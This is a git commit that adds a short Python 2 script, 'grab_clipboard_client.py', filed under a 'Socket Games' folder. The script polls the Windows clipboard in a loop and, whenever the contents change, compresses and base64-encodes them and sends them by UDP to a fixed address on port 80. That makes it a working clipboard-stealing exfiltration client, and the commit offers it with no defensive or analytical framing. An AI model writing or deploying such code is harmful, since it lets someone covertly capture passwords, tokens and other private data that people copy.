c473e1bcb33de222ee54ab4925a058829a8fd1c9
Phenix66 <34311559+Phenix66@users.noreply.github.com>
2018-07-09 14:09:32 -0400

    Create grab_clipboard_client.py

---
+++ Random Python/Socket Games/grab_clipboard_client.py
@@ -0,0 +1,19 @@
+# Run on Windows with Python
+import ctypes
+import time
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+olddata = ""
+while True:
+    ctypes.windll.user32.OpenClipboard(None)
+    clipdata = ctypes.c_char_p(ctypes.windll.user32.GetClipboardData(1)).value
+    ctypes.windll.user32.CloseClipboard()
+    if clipdata == olddata:
+        time.sleep(5)
+    else:
+        olddata = clipdata
+        print clipdata
+        message = (str(time.time())+":"+clipdata).encode("bz2").encode("base64")
+        s.sendto(message,("192.168.12.9",80))
